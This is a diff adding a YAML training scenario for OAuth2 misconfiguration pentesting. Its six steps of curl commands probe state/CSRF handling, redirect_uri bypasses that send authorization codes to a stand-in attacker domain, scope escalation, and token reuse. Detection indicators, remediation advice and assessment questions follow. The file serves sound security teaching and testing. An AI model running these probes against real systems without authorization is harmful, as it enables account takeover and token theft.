@@ -1,0 +1,205 @@
+# Category: Web Application Security - OAuth2 Attacks
+name: "OAuth2 Misconfiguration Testing"
+id: "web-oauth2-001"
+category: "web_application"
+subcategory: "authentication"
+difficulty: "intermediate"
+estimated_time: "60"
+
+tags:
+  - web-application
+  - oauth2
+  - authentication
+  - authorization-code
+  - implicit-flow
+  - csrf-token
+  - state-parameter
+  - open-redirect
+  - scope-escalation
+  - token-theft
+  - burp-suite
+  - owasp-a07
+  - mitre-t1550
+  - pentest
+  - red-team
+
+description: |
+  Test OAuth2 implementations for common misconfigurations including missing state
+  parameter, open redirect in redirect_uri, scope escalation, token leakage,
+  and implicit flow vulnerabilities that can lead to account takeover.
+
+learning_objectives:
+  - Identify OAuth2 flow vulnerabilities in authorization code and implicit flows
+  - Test for missing CSRF protection via state parameter
+  - Exploit open redirects in redirect_uri to steal authorization codes
+  - Escalate OAuth2 scope to access unauthorized resources
+
+tools:
+  - "burp_suite"
+  - "curl"
+  - "python3"
+  - "web_browser"
+
+prerequisites:
+  - "Understanding of OAuth2 authorization code flow"
+  - "Burp Suite proxy configured"
+  - "Test account on target application"
+  - "Written authorization from target owner"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Map the OAuth2 flow and identify endpoints"
+    commands:
+      - "# Discover OAuth endpoints"
+      - "curl -s 'https://[target_domain]/.well-known/openid-configuration' | python3 -m json.tool"
+      - "curl -s 'https://[target_domain]/.well-known/oauth-authorization-server' | python3 -m json.tool"
+      - "# Capture authorization request in Burp"
+      - "# Navigate to login and observe redirect to authorization endpoint"
+      - "# Note: response_type, client_id, redirect_uri, scope, state values"
+      - "curl -v 'https://[auth_server]/oauth/authorize?response_type=code&client_id=[client_id]&redirect_uri=[redirect_uri]&scope=openid+profile&state=[state]' 2>&1 | grep -E 'Location|HTTP'"
+    expected_output: "OAuth2 endpoints, supported flows, and authorization request parameters"
+    detection: "OAuth discovery endpoint access in server logs"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Test missing or reusable state parameter (CSRF)"
+    commands:
+      - "# Test if state parameter is required"
+      - "curl -s 'https://[auth_server]/oauth/authorize?response_type=code&client_id=[client_id]&redirect_uri=[redirect_uri]&scope=openid'"
+      - "# If no state — CSRF attack possible"
+      - "# Craft CSRF attack URL with attacker's authorization code"
+      - "# Attacker initiates OAuth with their account, captures code"
+      - "# Then tricks victim into submitting that code to the application"
+      - "# Test if same state value accepted twice"
+      - "# Initiate OAuth, get code, DO NOT complete — reuse same state"
+      - "curl -s 'https://[target_app]/oauth/callback?code=[code]&state=[state]'"
+      - "curl -s 'https://[target_app]/oauth/callback?code=[different_code]&state=[same_state]'"
+    expected_output: "Missing state = CSRF vulnerability; reusable state = state fixation risk"
+    detection: "Multiple callback requests with same state parameter in application logs"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Test redirect_uri validation for open redirect"
+    commands:
+      - "# Test if redirect_uri can be modified to attacker domain"
+      - "curl -v 'https://[auth_server]/oauth/authorize?response_type=code&client_id=[client_id]&redirect_uri=https://[attacker_domain]/callback&scope=openid' 2>&1 | grep 'Location'"
+      - "# Test partial match bypass"
+      - "curl -v 'https://[auth_server]/oauth/authorize?response_type=code&client_id=[client_id]&redirect_uri=https://[legitimate_domain].attacker.com/callback&scope=openid' 2>&1 | grep 'Location'"
+      - "# Test path traversal"
+      - "curl -v 'https://[auth_server]/oauth/authorize?response_type=code&client_id=[client_id]&redirect_uri=https://[legitimate_domain]/callback/../../../attacker&scope=openid' 2>&1 | grep 'Location'"
+      - "# Test URL parameter manipulation"
+      - "curl -v 'https://[auth_server]/oauth/authorize?response_type=code&client_id=[client_id]&redirect_uri=https://[legitimate_domain]/callback?next=https://[attacker_domain]&scope=openid' 2>&1 | grep 'Location'"
+    expected_output: "Authorization code redirected to attacker domain via redirect_uri bypass"
+    detection: "Authorization requests with non-registered redirect_uri values in auth server logs"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Scope escalation and parameter tampering"
+    commands:
+      - "# Test adding admin or elevated scopes"
+      - "curl -v 'https://[auth_server]/oauth/authorize?response_type=code&client_id=[client_id]&redirect_uri=[redirect_uri]&scope=openid+profile+admin' 2>&1 | grep 'Location'"
+      - "# Test scope manipulation in token exchange"
+      - "curl -s -X POST 'https://[auth_server]/oauth/token' -d 'grant_type=authorization_code&code=[auth_code]&redirect_uri=[redirect_uri]&client_id=[client_id]&client_secret=[client_secret]&scope=admin'"
+      - "# Test adding extra scopes not requested initially"
+      - "curl -s -X POST 'https://[auth_server]/oauth/token' -d 'grant_type=authorization_code&code=[auth_code]&redirect_uri=[redirect_uri]&client_id=[client_id]&client_secret=[client_secret]&scope=openid+profile+email+admin+write'"
+    expected_output: "Elevated scope token issued beyond what was originally authorized"
+    detection: "Scope escalation attempt in auth server token issuance logs"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Implicit flow token leakage via Referer header"
+    commands:
+      - "# Implicit flow delivers token in URL fragment"
+      - "# If page has external resources, token may leak via Referer"
+      - "curl -v 'https://[auth_server]/oauth/authorize?response_type=token&client_id=[client_id]&redirect_uri=[redirect_uri]&scope=openid' 2>&1 | grep 'Location'"
+      - "# URL fragment: https://app.com/callback#access_token=TOKEN&token_type=bearer"
+      - "# If page loads external CSS/JS — check if token in Referer header"
+      - "# Test by placing external resource on page that logs Referer"
+      - "# Also test history.pushState() for token leakage"
+    expected_output: "Access token in URL fragment potentially leaked via Referer to third-party resources"
+    detection: "Access token appearing in Referer headers in third-party server logs"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Token reuse and refresh token abuse"
+    commands:
+      - "# Test if authorization code can be reused"
+      - "curl -s -X POST 'https://[auth_server]/oauth/token' -d 'grant_type=authorization_code&code=[auth_code]&redirect_uri=[redirect_uri]&client_id=[client_id]'"
+      - "curl -s -X POST 'https://[auth_server]/oauth/token' -d 'grant_type=authorization_code&code=[same_auth_code]&redirect_uri=[redirect_uri]&client_id=[client_id]'"
+      - "# Test refresh token rotation — old token should be revoked"
+      - "curl -s -X POST 'https://[auth_server]/oauth/token' -d 'grant_type=refresh_token&refresh_token=[refresh_token]&client_id=[client_id]'"
+      - "# Try using old refresh token after rotation"
+      - "curl -s -X POST 'https://[auth_server]/oauth/token' -d 'grant_type=refresh_token&refresh_token=[old_refresh_token]&client_id=[client_id]'"
+    expected_output: "Code reuse or refresh token not invalidated after rotation = vulnerability"
+    detection: "Multiple token requests with same authorization code in auth server logs"
+
+compliance_controls:
+  - standard: "OWASP Top 10 2021"
+    control: "A07:2021"
+    description: "Identification and Authentication Failures — OAuth2 misconfiguration"
+  - standard: "OWASP ASVS v4.0"
+    control: "3.5.2"
+    description: "OAuth tokens are not transmitted in URLs"
+  - standard: "NIST 800-53 Rev5"
+    control: "IA-8"
+    description: "Identification and authentication — federated identity"
+  - standard: "PCI DSS v4.0"
+    control: "8.3.2"
+    description: "Strong cryptography for authentication credentials in transit"
+
+detection:
+  network_indicators:
+    - "Authorization requests with unregistered redirect_uri values"
+    - "Multiple token exchange requests using same authorization code"
+    - "Access tokens appearing in HTTP Referer headers"
+  log_indicators:
+    - "Auth server: redirect_uri mismatch errors"
+    - "Auth server: scope escalation attempts"
+    - "Application: authorization callback without valid state parameter"
+  endpoint_indicators:
+    - "Access token in browser history or server-side logs from URL fragment"
+    - "Refresh token used after expected rotation"
+
+remediation:
+  immediate:
+    - "Enforce exact redirect_uri matching — no partial or wildcard matching"
+    - "Require and validate state parameter on all authorization requests"
+    - "Enforce strict scope validation — never grant more than requested"
+  long_term:
+    - "Migrate from implicit flow to authorization code + PKCE"
+    - "Implement refresh token rotation with immediate revocation of old tokens"
+    - "Ensure authorization codes are single-use and short-lived (10 minutes max)"
+    - "Implement token binding to prevent token theft and replay"
+
+variables:
+  target_domain: "target.example.com"
+  auth_server: "auth.example.com"
+  target_app: "app.example.com"
+  client_id: "client_123"
+  client_secret: "secret_abc"
+  redirect_uri: "https://app.example.com/callback"
+  attacker_domain: "attacker.example.com"
+  state: "randomstate123"
+  auth_code: "authcode456"
+  different_code: "authcode789"
+  same_state: "randomstate123"
+  refresh_token: "refreshtoken123"
+  old_refresh_token: "oldrefreshtoken456"
+
+assessment_questions:
+  - "What is the purpose of the state parameter in OAuth2 authorization requests?"
+  - "How does an open redirect in redirect_uri lead to authorization code theft?"
+  - "Why is the implicit flow considered less secure than authorization code + PKCE?"
+  - "What is refresh token rotation and why is it a security best practice?"
+  - "How does PKCE (Proof Key for Code Exchange) prevent authorization code interception?"
+
+references:
+  - url: "https://portswigger.net/web-security/oauth"
+    title: "PortSwigger OAuth2 Vulnerabilities"
+  - url: "https://datatracker.ietf.org/doc/html/rfc6749"
+    title: "RFC 6749 - OAuth2 Framework"
+  - url: "https://oauth.net/2/pkce/"
+    title: "OAuth2 PKCE"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html"
+    title: "OWASP OAuth2 Cheat Sheet"
